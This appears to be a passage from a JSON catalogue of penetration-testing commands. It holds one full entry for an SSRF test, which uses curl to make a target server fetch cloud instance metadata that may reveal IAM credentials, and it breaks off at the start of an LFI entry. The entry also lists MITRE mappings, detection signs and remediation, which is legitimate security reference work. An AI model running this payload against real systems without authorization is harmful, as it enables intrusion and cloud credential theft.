  {
    "id": "ssrf-basic",
    "tool": "curl",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "curl 'http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/'",
    "name": "SSRF \u2014 Cloud Metadata",
    "description": "Tests for Server-Side Request Forgery to access cloud instance metadata.",
    "arguments": {
      "url parameter": "User-controlled URL that server fetches"
    },
    "expected_output": "ami-id: ami-12345\ninstance-type: t2.micro\niam-role: admin-role",
    "use_case": "Access cloud metadata service via SSRF \u2014 can reveal IAM credentials and instance info.",
    "prerequisites": [
      "URL parameter that fetches remote content",
      "Target on cloud (AWS/GCP/Azure)"
    ],
    "mitre_mapping": [
      "T1190",
      "T1552"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "Requests to 169.254.169.254 from application",
      "Unusual internal requests"
    ],
    "remediation": [
      "Block metadata IP in application",
      "Use IMDSv2 (token required)",
      "Input validation on URLs"
    ],
    "common_mistakes": [
      "Not trying different protocols (file://, gopher://)"
    ],
    "alternatives": [
      "manual testing with Burp"
    ],
    "references": [
      "https://portswigger.net/web-security/ssrf"
    ],
    "tags": [
      "ssrf",
      "cloud",
      "metadata",
      "aws",
      "internal"
    ]
  },
  {
    "id": "lfi-basic",
    "tool": "curl",
    "category": "web_testing",
